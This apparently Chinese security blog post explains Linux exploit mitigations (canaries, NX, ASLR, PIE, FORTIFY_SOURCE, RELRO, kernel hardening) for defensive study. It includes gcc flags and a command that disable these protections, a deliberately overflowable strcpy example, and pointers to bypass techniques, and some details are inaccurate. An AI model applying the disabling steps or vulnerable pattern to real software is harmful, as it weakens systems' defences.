<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"www.stxletto.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="安全风云波澜壮阔，对酒当歌人间值得。">
<meta property="og:type" content="website">
<meta property="og:title" content="深澜深蓝">
<meta property="og:url" content="http://www.stxletto.com/index.html">
<meta property="og:site_name" content="深澜深蓝">
<meta property="og:description" content="安全风云波澜壮阔，对酒当歌人间值得。">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="stxletto">
<meta property="article:tag" content="安全">
<meta property="article:tag" content="漏洞">
<meta property="article:tag" content="分析">
<meta property="article:tag" content="威胁">
<meta property="article:tag" content="识别">
<meta property="article:tag" content="检测">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://www.stxletto.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>深澜深蓝</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">深澜深蓝</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>作品</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://www.stxletto.com/2020/04/28/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E7%BC%BA%E9%99%B7%E7%BC%93%E8%A7%A3%E6%9C%BA%E5%88%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="stxletto">
      <meta itemprop="description" content="安全风云波澜壮阔，对酒当歌人间值得。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="深澜深蓝">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/04/28/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E7%BC%BA%E9%99%B7%E7%BC%93%E8%A7%A3%E6%9C%BA%E5%88%B6/" class="post-title-link" itemprop="url">Linux系统安全缺陷缓解机制</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-04-28 22:44:37 / 修改时间：22:46:01" itemprop="dateCreated datePublished" datetime="2020-04-28T22:44:37+08:00">2020-04-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Linux系统安全缺陷缓解机制"><a href="#Linux系统安全缺陷缓解机制" class="headerlink" title="Linux系统安全缺陷缓解机制"></a>Linux系统安全缺陷缓解机制</h1><p>现代Linux发行版提供了一些缓解技术，使更难稳定利用软件漏洞。 例如只读重定位（RELRO，RELocation Read-Only），禁止执行（NX，NoExecute），栈保护（Canaries），地址空间布局随机化（ASLR，Address Space Layout Randomization）和位置无关可执行文件（PIE，Position Independent Executables）之类的缓解措施，已经使稳定利已知漏洞的挑战的更加困难。</p>
<h2 id="1-用户空间强化-Userspace-Hardening"><a href="#1-用户空间强化-Userspace-Hardening" class="headerlink" title="1 用户空间强化(Userspace Hardening)"></a>1 用户空间强化(Userspace Hardening)</h2><p>通过用于构建软件包的默认编译器标志以及Ubuntu内核，可以启用许多安全特性。 注意：Ubuntu的编译器强化不仅适用于其官方发布的程序，也适用于使用其编译器在Ubuntu上构建的任何内容。</p>
<h3 id="1-1-栈的保护-Stack-Protector"><a href="#1-1-栈的保护-Stack-Protector" class="headerlink" title="1.1 栈的保护(Stack Protector)"></a>1.1 栈的保护(Stack Protector)</h3><p>很久之前，矿工在煤井中挖煤时，经常遇到瓦斯泄露的安全事故。后来有人发现一种鸟–金丝雀对瓦斯很敏感。于是矿工就用它作为安全报警装置。</p>
<p>Stack Protector又名canary、stack cookie等，gcc中的-fstack-protector参数提供了一个随机的栈金丝雀(stack canary)，类似于Windows平台下Visual Studio中的GS。</p>
<p>栈保护是一种针对栈缓冲区溢出攻击的缓解机制，当函数存在栈缓冲区溢出漏洞时，攻击者可以通过覆盖栈上的返回地址来执行shellcode。当启用栈保护后，调用函数前先往栈里存入一个cookie。在Linux中我们把这个cookie称为canary。当函数返回后再验证cookie是否和之前的值一致，如果不一致就终止进程。因为攻击者在覆盖返回地址的时候往往也会覆盖cookie，导致栈保护检查失败从而阻止执行任意代码。</p>
<p>在编译时可以选择是否启用栈保护以及程度，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c						 &#x2F;&#x2F; 默认情况下，不开启 Canary 保护</span><br><span class="line">gcc -fno-stack-protector -o test test.c  &#x2F;&#x2F; 禁用栈保护</span><br><span class="line">gcc -fstack-protector -o test test.c     &#x2F;&#x2F; 启用栈保护，只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o test test.c &#x2F;&#x2F; 启用栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>

<p>绕过栈保护机制的常见方法有：泄露canary、暴破canary、劫持__stack_chk_fail、伪造canary、SSP泄露。</p>
<p>详见：</p>
<p><a href="https://www.anquanke.com/post/id/177832" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177832</a></p>
<p><a href="https://zhakul.top/archives/216" target="_blank" rel="noopener">https://zhakul.top/archives/216</a></p>
<h3 id="1-2-堆的保护-Heap-Protector"><a href="#1-2-堆的保护-Heap-Protector" class="headerlink" title="1.2 堆的保护(Heap Protector)"></a>1.2 堆的保护(Heap Protector)</h3><p>GNU C库堆保护机制（通过ptmalloc和手动两种方式自动进行）为glibc堆内存管理器（在glibc 2.3.4中首次引入）提供了对损坏列表/断开链接/双重释放/溢出( corrupted-list/unlink/double-free/overflow)的防护。 这将防止通过堆内存溢出破坏malloc堆内存区域的控制结构来执行任意代码的能力。</p>
<h3 id="1-3-指针混淆-Pointer-Obfuscation"><a href="#1-3-指针混淆-Pointer-Obfuscation" class="headerlink" title="1.3 指针混淆(Pointer Obfuscation)"></a>1.3 指针混淆(Pointer Obfuscation)</h3><p>glibc中存储的某些指针会通过glibc内部的PTR_MANGLE/PTR_UNMANGLE宏进行混淆，以防止libc函数指针在运行时被覆盖。</p>
<h3 id="1-4-不可执行内存-Non-Executable-Memory"><a href="#1-4-不可执行内存-Non-Executable-Memory" class="headerlink" title="1.4 不可执行内存(Non-Executable Memory)"></a>1.4 不可执行内存(Non-Executable Memory)</h3><p>大多数现代CPU都可以防止执行不可执行的内存区域（堆，堆栈等）。 这被称为“非eXecute（NX）”或“ eXecute-Disable（XD）”，某些BIOS制造商默认情况下会不必要地禁用它，因此请检查BIOS设置。 这种保护减少了攻击者可以用来执行任意代码执行的区域。 它要求内核使用“ PAE”寻址（也允许对3GB以上的物理地址进行寻址）。 64位和32位-server和-generic-pae内核使用PAE寻址进行编译。 从Ubuntu 9.10开始，针对在32位内核（带有或不带有PAE的内核）上运行的缺少NX的处理器，部分模拟了这种保护。</p>
<p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标记为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
<p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c					&#x2F;&#x2F; 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o test test.c		&#x2F;&#x2F; 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o test test.c	&#x2F;&#x2F; 开启NX保护</span><br></pre></td></tr></table></figure>

<p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p>
<p>绕过NX防护手段的方法主要是ROP，详见：</p>
<p><a href="https://www.cnblogs.com/ichunqiu/p/11196219.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/11196219.html</a></p>
<h3 id="1-5-地址空间布局随机化-Address-Space-Layout-Randomisation"><a href="#1-5-地址空间布局随机化-Address-Space-Layout-Randomisation" class="headerlink" title="1.5 地址空间布局随机化(Address Space Layout Randomisation)"></a>1.5 地址空间布局随机化(Address Space Layout Randomisation)</h3><p>ASLR由内核和ELF加载器通过随机化内存分配（栈、堆、共享库等）的位置来实现。 这使得攻击者在尝试进行内存破坏利用时，内存地址更难预测。ASLR在系统范围内受/ proc / sys / kernel / randomize_va_space的值控制。 在Ubuntu 8.10之前，此选项默认为“ 1”（上）。 在包含brk ASLR的更高发行版中，它默认为“ 2”（在brk ASLR上启用）。</p>
<p>ASLR(Address space layout randomization，地址空间布局随机化)通过随机放置数据区域的地址空间来防止攻击者跳转到内存的特定位置。在 Windows 上 ASLR 主要包括堆栈随机化、PEB与TEB随机化、映像随机化，windows系统上虽然xp时代就提出来了，但是从vista开始ASLR才真正发挥作用。在linux上ASLR主要包括栈地址随机化、LIBS/MMAP随机化、EXEC随机化、BRK随机化、VDSO随机化。在没有ASLR的情况下让程序跳转到一个已经存在的系统函数的漏洞利用方式被称为ret2libc。</p>
<p>一般情况下NX（Windows平台上称其为DEP）和地址空间布局随机化（ASLR）会同时工作。可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
<p>地址空间布局随机化，有以下三种情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure>

<h4 id="1-5-1-栈的ASLR"><a href="#1-5-1-栈的ASLR" class="headerlink" title="1.5.1 栈的ASLR"></a>1.5.1 栈的ASLR</h4><p>每次执行程序都会有不同的栈内存空间布局。 这使得很难在内存中定位要攻击或传递可执行攻击有效负载的位置。 </p>
<h4 id="1-5-2-LIBS-MMAP的ASLR"><a href="#1-5-2-LIBS-MMAP的ASLR" class="headerlink" title="1.5.2 LIBS/MMAP的ASLR"></a>1.5.2 LIBS/MMAP的ASLR</h4><p>每次执行程序的都会产生不同的mmap内存空间布局（这会使动态加载库每次都加载到不同的内存地址）。 这使得很难在内存中找到类似“return to libc”攻击的跳转位置。</p>
<p>可以这么理解，LIBS/MMAP随机化相当于windows中dll的随机化，而EXEC随机化相当于windows中exe的随机化。</p>
<h4 id="1-5-3-EXEC的ASLR"><a href="#1-5-3-EXEC的ASLR" class="headerlink" title="1.5.3 EXEC的ASLR"></a>1.5.3 EXEC的ASLR</h4><p>使用“ -fPIE -pie”参数构建的程序的每次执行时，都将被加载到不同的内存位置。 这使得基于内存破坏的攻击，很难在内存中定位到要攻击或跳转的位置。</p>
<h4 id="1-5-4-BRK的ASLR"><a href="#1-5-4-BRK的ASLR" class="headerlink" title="1.5.4 BRK的ASLR"></a>1.5.4 BRK的ASLR</h4><p>与exec ASLR相似，brk ASLR调整exec内存区域和brk内存区域之间的相对内存位置（对于small malloc）。 在2.6.26（Ubuntu 8.10）中添加了来自exec内存的brk偏移量的随机化，尽管brk ASLR的一些影响可以在Ubuntu 8.04 LTS中的PIE程序中看到，因为exec是ASLR，并且brk在执行后立即分配 区域（因此从技术上讲是随机的，但直到8.10才相对于文本区域随机化）。</p>
<p>linux系统中brk和mmap这两个系统调用用来分配内存。当brk ASLR关闭的时候，start_brk和brk都是指向bss段的尾部的；当brk ASLR开启的时候，start_brk和brk初始位置是bss段的尾部加一个随机的偏移。</p>
<h4 id="1-5-5-VDSO的ASLR"><a href="#1-5-5-VDSO的ASLR" class="headerlink" title="1.5.5 VDSO的ASLR"></a>1.5.5 VDSO的ASLR</h4><p>程序的每次执行都会导致一个随机的vdso位置。 这样可以防止跳入系统调用(jump-into-syscall)攻击。</p>
<p>VDSO(Virtual Dynamically-linked Shared Object，虚拟动态共享库)将内核态的调用映射到用户态的地址空间中，使得调用开销更小，路径更好。拿x86下的系统调用举例，传统的int 0x80有点慢，Intel和AMD分别实现了sysenter/sysexit和syscall/sysret，即所谓的快速系统调用指令，使用它们更快，但是也带来了兼容性的问题。于是linux实现了vsyscall，程序统一调用vsyscall，具体的选择由内核来决定，vsyscall的实现就在VDSO中。执行ldd /bin/sh，会发现有个linux-vdso.so.1的动态文件，而系统中却找不到它，它就是VDSO。</p>
<h3 id="1-6-编译时强化-Built-with"><a href="#1-6-编译时强化-Built-with" class="headerlink" title="1.6 编译时强化(Built with)"></a>1.6 编译时强化(Built with)</h3><h4 id="1-6-1-编译时使用PIE参数-Built-as-PIE"><a href="#1-6-1-编译时使用PIE参数-Built-as-PIE" class="headerlink" title="1.6.1 编译时使用PIE参数(Built as PIE)"></a>1.6.1 编译时使用PIE参数(Built as PIE)</h4><p>使用“ -fPIE -pie”参数构建的位置无关可执行文件（PIE）都可以利用exec ASLR。 这样可以防止“返回文本(return-to-text)”，并且通常会阻止内存破坏攻击。 在构建整个程序包时，需要对编译器选项进行统一更改。 PIE在只有较少数量的通用寄存器（例如x86）的体系结构上会造成很大的性能损失（5-10％），因此它最初仅用于选定数量的安全关键软件包。在64位体系结构上的PIE没有相同的缺陷，并且已将其设为默认值。</p>
<p>前面说了EXEC的随机化，实际上更准确的说法是PIE(Position Independent Executables，位置无关可执行文件)。PIE只有在系统开启ASLR和编译时开启-fpie -pie选项这两个条件同时满足时才会生效。</p>
<ul>
<li>PIE：<code>-no-pie</code> / <code>-pie</code> (关闭 / 开启)</li>
</ul>
<p>位置无关的可执行文件（PIE，Position Independent Executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>
<p>liunx下关闭PIE的命令如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br></pre></td></tr></table></figure>

<p>gcc编译命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c				&#x2F;&#x2F; 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o test test.c		&#x2F;&#x2F; 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o test test.c		&#x2F;&#x2F; 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o test test.c		&#x2F;&#x2F; 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o test test.c		&#x2F;&#x2F; 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure>

<p>PIE最早由RedHat的人实现，他在连接起上增加了-pie选项，这样使用-fPIE编译的对象就能通过连接器得到位置无关可执行程序。fPIE和fPIC有些不同。可以参考<a href="http://writeblog.csdn.net/2009/11/20/10065/" target="_blank" rel="noopener">Gcc和Open64中的-fPIC选项</a>.</p>
<p>gcc中的-fpic选项，使用于在目标机支持时，编译共享库时使用。编译出的代码将通过全局偏移表(Global Offset<br>Table)中的常数地址访存，动态装载器将在程序开始执行时解析GOT表项(注意，动态装载器操作系统的一部分，连接器是GCC的一部分)。而gcc中的-fPIC选项则是针对某些特殊机型做了特殊处理，比如适合动态链接并能避免超出GOT大小限制之类的错误。而Open64仅仅支持不会导致GOT表溢出的PIC编译。</p>
<p>gcc中的-fpie和-fPIE选项和fpic及fPIC很相似，但不同的是，除了生成为位置无关代码外，还能假定代码是属于本程序。通常这些选项会和GCC链接时的-pie选项一起使用。fPIE选项仅能在编译可执行码时用，不能用于编译库。所以，如果想要PIE的程序，需要你除了在gcc增加-fPIE选项外，还需要在ld时增加-pie选项才能产生这种代码。即gcc -fpie -pie来编译程序。单独使用哪一个都无法达到效果。</p>
<p>绕过PIE</p>
<p><a href="https://www.cnblogs.com/ichunqiu/p/11350476.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/11350476.html</a></p>
<h4 id="1-6-2-编译时使用Fortify-Source参数-Built-with-Fortify-Source"><a href="#1-6-2-编译时使用Fortify-Source参数-Built-with-Fortify-Source" class="headerlink" title="1.6.2 编译时使用Fortify Source参数(Built with Fortify Source)"></a>1.6.2 编译时使用Fortify Source参数(Built with Fortify Source)</h4><p>使用“ -D_FORTIFY_SOURCE = 2”（以及-O1或更高版本）构建的程序在glibc中启用了几种编译时和运行时保护：</p>
<ul>
<li>当已知目的缓冲区的大小时，将对“ sprintf”，“ strcpy”的无长度限定的调用扩展为它们有长度限制的表亲函数（防止内存溢出）。</li>
<li>当格式化字符串位于可写内存段中时，阻止使用格式字化符串“％n”的攻击。</li>
<li>检查重要的函数返回值和参数（例如system，write，open）。</li>
<li>创建新文件时需要指定文件掩码。</li>
</ul>
<p>fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。</p>
<p>_FORTIFY_SOURCE设为1，并且将编译器设置为优化1(<em>gcc -O1</em>)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能</p>
<p>_FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。</p>
<p><code>gcc -D_FORTIFY_SOURCE=1</code> 仅仅只会在编译时进行检查 (特别像某些头文件 <code>#include &lt;string.h&gt;</code>)</p>
<p><code>gcc -D_FORTIFY_SOURCE=2</code> 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)</p>
<p>举个例子可能简单明了一些：<br>一段简单的存在缓冲区溢出的C代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void fun(char *s) &#123;</span><br><span class="line">        char buf[0x100];</span><br><span class="line">        strcpy(buf, s);</span><br><span class="line">        &#x2F;* Don&#39;t allow gcc to optimise away the buf *&#x2F;</span><br><span class="line">        asm volatile(&quot;&quot; :: &quot;m&quot; (buf));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用包含参数-U_FORTIFY_SOURCE编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">08048450 &lt;fun&gt;:</span><br><span class="line">  push   %ebp               ; </span><br><span class="line">  mov    %esp,%ebp</span><br><span class="line"></span><br><span class="line">  sub    $0x118,%esp        ; 将0x118存储到栈上</span><br><span class="line">  mov    0x8(%ebp),%eax     ; 将目标参数载入eax</span><br><span class="line">  mov    %eax,0x4(%esp)     ; 保存目标参数</span><br><span class="line">  lea    -0x108(%ebp),%eax  ; 数组buf</span><br><span class="line">  mov    %eax,(%esp)        ; 保存</span><br><span class="line">  call   8048320 &lt;strcpy@plt&gt;</span><br><span class="line"></span><br><span class="line">  leave                     ; </span><br><span class="line">  ret</span><br></pre></td></tr></table></figure>

<p>用包含参数-D_FORTIFY_SOURCE=2编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">08048470 &lt;fun&gt;:</span><br><span class="line">  push   %ebp               ; </span><br><span class="line">  mov    %esp,%ebp</span><br><span class="line"></span><br><span class="line">  sub    $0x118,%esp        ; </span><br><span class="line">  movl   $0x100,0x8(%esp)   ; 把0x100当作目标参数保存</span><br><span class="line">  mov    0x8(%ebp),%eax     ; </span><br><span class="line">  mov    %eax,0x4(%esp)     ; </span><br><span class="line">  lea    -0x108(%ebp),%eax  ; </span><br><span class="line">  mov    %eax,(%esp)        ; </span><br><span class="line">  call   8048370 &lt;__strcpy_chk@plt&gt;</span><br><span class="line"></span><br><span class="line">  leave                      ; </span><br><span class="line">  ret</span><br></pre></td></tr></table></figure>

<p>我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p>
<p>总结下就有:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c							&#x2F;&#x2F; 默认情况下，不会开这个检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;1 -o test test.c		&#x2F;&#x2F; 较弱的检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;2 -o test test.c		&#x2F;&#x2F; 较强的检查</span><br></pre></td></tr></table></figure>

<h4 id="1-6-3-编译时使用RELRO参数-Built-with-RELRO"><a href="#1-6-3-编译时使用RELRO参数-Built-with-RELRO" class="headerlink" title="1.6.3 编译时使用RELRO参数(Built with RELRO)"></a>1.6.3 编译时使用RELRO参数(Built with RELRO)</h4><p>在Linux系统安全领域数据可以写的内存区域就会是攻击的目标，尤其是存储函数指针的地方。所以从安全防护的角度来说，尽量减少可写的内存区域对安全会有极大的好处。</p>
<p>通过使加载程序将重定位表的任何区域标记为只读，以在加载时解析任何符号（“只读重定位”），从而使ELF程序防范加载程序内存区覆盖写的攻击。这减少了GOT覆盖写形式(GOT-overwrite-style)的内存破坏攻击的范围。</p>
<p>RELRO(RELocation Read-Only，只读重定位)让加载器将重定位表中加载时解析的符号标记为只读，这减少了GOT覆盖写的攻击面。RELRO可以分为部分RELRO(Partial RELRO)和完全RELRO(Full RELRO)。开启Partial RELRO的话GOT表是可写的；开启FULL RELRO的话GOT表是只读的。开启-Wl,-z,relro选项即可开启Partial RELRO；开启-Wl,-z,relro,-z,now选项即可开启Full RELRO。</p>
<p>设置符号重定位表为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。当RELRO为” Partial RELRO”时，说明我们对GOT表具有写权限；如果开启FULL RELRO，意味着我们无法修改GOT表。</p>
<p>gcc编译：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c						&#x2F;&#x2F; 默认情况下，是 Partial RELRO</span><br><span class="line">gcc -z norelro -o test test.c			&#x2F;&#x2F; 关闭，即 No RELRO</span><br><span class="line">gcc -z lazy -o test test.c				&#x2F;&#x2F; 部分开启，即 Partial RELRO</span><br><span class="line">gcc -z now -o test test.c				&#x2F;&#x2F; 全部开启，即 FULL RELRO</span><br></pre></td></tr></table></figure>

<h4 id="1-6-4-编译时使用BIND-NOW参数-Built-with-BIND-NOW"><a href="#1-6-4-编译时使用BIND-NOW参数-Built-with-BIND-NOW" class="headerlink" title="1.6.4 编译时使用BIND_NOW参数(Built with BIND_NOW)"></a>1.6.4 编译时使用BIND_NOW参数(Built with BIND_NOW)</h4><p>标记ELF程序在启动时就解析所有动态符号（而不是”按需形式“(延时绑定)，也称为“立即绑定”），以便可以将GOT完全设为只读（与上面的RELRO结合使用时）。</p>
<h4 id="1-6-5-编译时使用fstack-clash参数-Built-with-fstack-clash-protection"><a href="#1-6-5-编译时使用fstack-clash参数-Built-with-fstack-clash-protection" class="headerlink" title="1.6.5 编译时使用fstack-clash参数(Built with -fstack-clash-protection)"></a>1.6.5 编译时使用fstack-clash参数(Built with -fstack-clash-protection)</h4><p>在可变长度栈内存分配（通过alloca()或gcc可变长度数组等）周围添加额外的指令，以在分配时探测内存的每一页。 通过确保所有栈内存分配均有效（或通过引发分段错误（如果无效）并把可能的代码执行攻击转变为拒绝服务），这可以缓解栈冲突(stack-clash)攻击。</p>
<h4 id="1-6-6-编译时使用-fcf-protection参数-Built-with-fcf-protection"><a href="#1-6-6-编译时使用-fcf-protection参数-Built-with-fcf-protection" class="headerlink" title="1.6.6 编译时使用-fcf-protection参数(Built with -fcf-protection)"></a>1.6.6 编译时使用-fcf-protection参数(Built with -fcf-protection)</h4><p>指示编译器生成指令以支持英特尔的控制流强制技术（CET,  Control-flow Enforcement Technology）。</p>
<h2 id="2-内核强化-Kernel-Hardening"><a href="#2-内核强化-Kernel-Hardening" class="headerlink" title="2 内核强化(Kernel Hardening)"></a>2 内核强化(Kernel Hardening)</h2><p>内核本身启用的保护功能，使其更难以受到威胁。</p>
<h3 id="2-1-零地址保护-0-address-protection"><a href="#2-1-零地址保护-0-address-protection" class="headerlink" title="2.1 零地址保护(0-address protection)"></a>2.1 零地址保护(0-address protection)</h3><p>由于内核和用户空间共享虚拟内存地址，因此需要对“ NULL”内存地址进行保护，以使用户空间mmap的内存无法从地址0开始，从而阻止” NULL解引用”(“NULL dereference”)内核攻击。</p>
<h3 id="2-2-dev-mem保护-dev-mem-protection"><a href="#2-2-dev-mem保护-dev-mem-protection" class="headerlink" title="2.2 /dev/mem保护(/dev/mem protection)"></a>2.2 /dev/mem保护(/dev/mem protection)</h3><p>某些应用程序（Xorg）需要从用户空间直接访问物理内存。 存在特殊文件/ dev / mem来提供此访问。 过去，如果攻击者具有root用户访问权限，则可以从该文件查看和更改内核内存。 引入了CONFIG_STRICT_DEVMEM内核选项以阻止对非设备存储器的访问。</p>
